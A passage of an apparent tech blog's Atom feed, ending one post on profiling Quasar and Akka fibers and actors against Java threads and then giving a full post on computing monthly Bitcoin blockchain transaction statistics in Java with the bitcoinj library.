&lt;td&gt;com.github.vy.fibertest.QuasarFiberRingBenchmark$InternalFiber.run&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;&lt;th colspan="6"&gt;Quasar Actors&lt;/th&gt;&lt;/tr&gt;
		&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;22,17%&lt;/td&gt;
&lt;td&gt;22,17%&lt;/td&gt;
&lt;td&gt;77787&lt;/td&gt;
&lt;td&gt;300526&lt;/td&gt;
&lt;td&gt;co.paralleluniverse.fibers.Fiber.park1&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;18,53%&lt;/td&gt;
&lt;td&gt;40,69%&lt;/td&gt;
&lt;td&gt;65011&lt;/td&gt;
&lt;td&gt;300508&lt;/td&gt;
&lt;td&gt;co.paralleluniverse.fibers.Fiber.run&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr class="highlight"&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;18,32%&lt;/td&gt;
&lt;td&gt;59,01%&lt;/td&gt;
&lt;td&gt;64292&lt;/td&gt;
&lt;td&gt;300527&lt;/td&gt;
&lt;td&gt;co.paralleluniverse.strands.channels.SingleConsumerQueueChannel.receive&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;18,27%&lt;/td&gt;
&lt;td&gt;77,28%&lt;/td&gt;
&lt;td&gt;64114&lt;/td&gt;
&lt;td&gt;300517&lt;/td&gt;
&lt;td&gt;com.github.vy.fibertest.QuasarActorRingBenchmark$InternalActor.doRun&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;17,39%&lt;/td&gt;
&lt;td&gt;94,67%&lt;/td&gt;
&lt;td&gt;61009&lt;/td&gt;
&lt;td&gt;300528&lt;/td&gt;
&lt;td&gt;co.paralleluniverse.actors.ActorRunner.run&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;&lt;th colspan="6"&gt;Akka Actors&lt;/th&gt;&lt;/tr&gt;
		&lt;tr class="highlight"&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;64,09%&lt;/td&gt;
&lt;td&gt;64,09%&lt;/td&gt;
&lt;td&gt;5158&lt;/td&gt;
&lt;td&gt;300307&lt;/td&gt;
&lt;td&gt;scala.concurrent.forkjoin.ForkJoinPool.runWorker&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;12,51%&lt;/td&gt;
&lt;td&gt;76,60%&lt;/td&gt;
&lt;td&gt;1007&lt;/td&gt;
&lt;td&gt;300298&lt;/td&gt;
&lt;td&gt;sun.misc.Unsafe.park&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;10,69%&lt;/td&gt;
&lt;td&gt;87,29%&lt;/td&gt;
&lt;td&gt;860&lt;/td&gt;
&lt;td&gt;300309&lt;/td&gt;
&lt;td&gt;sun.misc.Unsafe.unpark&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;2,65%&lt;/td&gt;
&lt;td&gt;89,94%&lt;/td&gt;
&lt;td&gt;213&lt;/td&gt;
&lt;td&gt;300300&lt;/td&gt;
&lt;td&gt;scala.concurrent.forkjoin.ForkJoinPool.scan&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;1,12%&lt;/td&gt;
&lt;td&gt;91,05%&lt;/td&gt;
&lt;td&gt;90&lt;/td&gt;
&lt;td&gt;300316&lt;/td&gt;
&lt;td&gt;akka.dispatch.Dispatcher.dispatch&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;&lt;th colspan="6"&gt;Java Threads&lt;/th&gt;&lt;/tr&gt;
		&lt;tr class="highlight"&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;94,33%&lt;/td&gt;
&lt;td&gt;94,33%&lt;/td&gt;
&lt;td&gt;10373&lt;/td&gt;
&lt;td&gt;300057&lt;/td&gt;
&lt;td&gt;sun.misc.Unsafe.unpark&lt;/td&gt;
&lt;/tr&gt;
		&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;5,59%&lt;/td&gt;
&lt;td&gt;99,93%&lt;/td&gt;
&lt;td&gt;615&lt;/td&gt;
&lt;td&gt;300058&lt;/td&gt;
&lt;td&gt;sun.misc.Unsafe.park&lt;/td&gt;
&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;
&lt;style type="text/css"&gt;
table#hprof tr.highlight td { color: red; }
table#hprof td { padding: 1px; }
&lt;/style&gt;

&lt;p&gt;As anticipated, Java Threads were bitten by &lt;code&gt;park&lt;/code&gt;/&lt;code&gt;unpark&lt;/code&gt; methods in
&lt;code&gt;sun.misc.Unsafe&lt;/code&gt;. Whereas, Akka Actors and Quasar Fibers perform some sort of
interleaving between routines to avoid these calls and that totally rocks.
Unfortunately, it turns out that the channel mechanisms (e.g.,
&lt;code&gt;co.paralleluniverse.strands.channels.SingleConsumerQueueChannel&lt;/code&gt;) in Quasar
Actors somehow trigger the Quasar core to employ &lt;code&gt;park&lt;/code&gt; calls in between the
message receivers and that predominantly consumes the majority of the fiber
runtime.&lt;/p&gt;

&lt;h1 id="the-conclusion"&gt;The Conclusion&lt;/h1&gt;

&lt;p&gt;Observing that fiber implementations perform superior compared to standard Java
Threads is nothing new. However, seeing Quasar Fibers showing up impressive
performance is not something I was expecting, considering that the project is in
its very early stages. That being said, it appears that channels in Quasar
Actors have a certain room for improvement and might borrow some ideas from its
Akka counterpart. In the overall, both fiber implementations show stable and
noteworthy performance figures and stand as a perfect standard Java Thread
replacement for a considerable amount of use cases.&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:vy.github.io,2014-06-27://blog/post/2014/06/27/parse-bitcoin-blockchain/</id>
    <title type="html">Parsing Bitcoin Blockchain Data in Java</title>
    <published>2014-06-27T16:49:00Z</published>
    <updated>2014-06-27T16:49:00Z</updated>
    <link rel="alternate" href="https://vy.github.io//blog/post/2014/06/27/parse-bitcoin-blockchain/"/>
    <content type="html">
&lt;p&gt;Last week I spent some time on collecting certain statistics (e.g., average
number of performed transactions and created blocks per month) over a vast
(~20GB) Bitcoin blockchain dataset. The hardest part for me was to pick the
right tool to parse the raw blockchain data. First, I hit the Google with
&lt;em&gt;“parse bitcoin blockchain”&lt;/em&gt; keywords. Unfortunately, the returned results
(&lt;a href="https://github.com/gavinandresen/bitcointools"&gt;bitcointools&lt;/a&gt;,
&lt;a href="https://code.google.com/p/blockchain/"&gt;blockchain&lt;/a&gt;,
&lt;a href="https://github.com/znort987/blockparser"&gt;blockparser&lt;/a&gt;, etc.) point to almost
undocumented projects, where some appear to not even work. (As a side note,
bitcointools require a running BitcoinQt/bitcoind process in the background,
which I find pretty amusing.) Next, I checked some papers on Google Scholars to
find out how other people solved the problem. A paper leaded me to
&lt;a href="https://github.com/etotheipi/BitcoinArmory"&gt;BitcoinArmory&lt;/a&gt; project, which
requires a dozen of manual interventions to get installed. (I did not even
attempt to install it.) Suddenly, it occured me to add a &lt;em&gt;“java”&lt;/em&gt; keyword to the
search phrase, which led me to &lt;a href="https://bitcoinj.github.io/"&gt;bitcoinj&lt;/a&gt; project.
&lt;strong&gt;&lt;em&gt;bitcoinj is far most the best Bitcoin blockchain parser library that I have
ever met.&lt;/em&gt;&lt;/strong&gt; It has a rich documentation, developer-friendly (and fully
documented) API and works out of the box. It is composed of a single JAR, no
other requirements, stupid hassles, etc. In addition, its IRC channel at
FreeNode is packed with real people that provide instant support on any Bitcoin
related questions.&lt;/p&gt;

&lt;p&gt;Enough with the talk! Let’s get our hands dirty with the code. I first included
the bitcoinj Maven dependency in my &lt;code&gt;pom.xml&lt;/code&gt; as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-xml"&gt;&lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;com.google&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;bitcoinj&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;0.11.3&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;scope&amp;gt;&lt;/span&gt;compile&lt;span class="nt"&gt;&amp;lt;/scope&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, I downloaded a couple of raw blockchain data for test purposes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
&lt;a href="https://code.google.com/p/blockchain/source/browse/trunk/blk00000.dat"&gt;Sample data composed of 5000 blocks&lt;/a&gt; (128 MB)&lt;/li&gt;
  &lt;li&gt;
&lt;a href="https://bitfetch.com/static/bootstrap.7z"&gt;From the genesis block through height 295,000&lt;/a&gt; (4.7 GB)&lt;/li&gt;
  &lt;li&gt;
&lt;a href="https://bitcoin.org/bin/blockchain/bootstrap.dat.torrent"&gt;From the genesis block through a recent height&lt;/a&gt; (~17 GB as of this post)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Here comes the simplest part: the Java code. Below, I calculate the average
number of transactions per block per month.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;com.google.bitcoin.core.Block&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;com.google.bitcoin.core.NetworkParameters&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;com.google.bitcoin.core.PrunedException&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;com.google.bitcoin.core.Transaction&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;com.google.bitcoin.params.MainNetParams&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;com.google.bitcoin.store.BlockStoreException&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.io.File&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.ArrayList&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;  
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.HashMap&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.List&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.Map&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// Arm the blockchain file loader.&lt;/span&gt;
&lt;span class="n"&gt;NetworkParameters&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;MainNetParams&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;File&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;blockChainFiles&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ArrayList&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
&lt;span class="n"&gt;blockChainFiles&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;File&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"/tmp/bootstrap.dat"&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
&lt;span class="n"&gt;BlockFileLoader&lt;/span&gt; &lt;span class="n"&gt;bfl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;BlockFileLoader&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blockChainFiles&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

&lt;span class="c1"&gt;// Data structures to keep the statistics.&lt;/span&gt;
&lt;span class="n"&gt;Map&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;monthlyTxCount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
&lt;span class="n"&gt;Map&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;monthlyBlockCount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;gt;();&lt;/span&gt;

&lt;span class="c1"&gt;// Iterate over the blocks in the dataset.&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Block&lt;/span&gt; &lt;span class="n"&gt;block&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;bfl&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="c1"&gt;// Extract the month keyword.&lt;/span&gt;
    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;month&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;SimpleDateFormat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"yyyy-MM"&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;format&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;block&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getTime&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;

    &lt;span class="c1"&gt;// Make sure there exists an entry for the extracted month.&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(!&lt;/span&gt;&lt;span class="n"&gt;monthlyBlockCount&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;containsKey&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;month&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;monthlyBlockCount&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;month&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;monthlyTxCount&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;month&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="c1"&gt;// Update the statistics.&lt;/span&gt;
    &lt;span class="n"&gt;monthlyBlockCount&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;month&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;monthlyBlockCount&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;month&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;monthlyTxCount&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;month&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;block&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getTransactions&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;size&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;monthlyTxCount&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;month&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;

&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;// Compute the average number of transactions per block per month.&lt;/span&gt;
&lt;span class="n"&gt;Map&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Float&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;monthlyAvgTxCountPerBlock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;month&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;monthlyBlockCount&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;keySet&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt;
    &lt;span class="n"&gt;monthlyAvgTxCountPerBlock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;
            &lt;span class="n"&gt;month&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;monthlyTxCount&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;month&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;monthlyBlockCount&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;month&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That’s it! In order to appreciate the hassle-free simplicity of the bitcoinj
interface, you ought to take your time and spend a couple of hours on other
tools first. (About the performance, for the sample blockchain dataset of size
4.7 GB, above code snippet completes in less than 2 minutes on my 2.4 GHz
GNU/Linux notebook without any JVM flags. Pretty zippy!)&lt;/p&gt;
</content>
  </entry>
</feed>

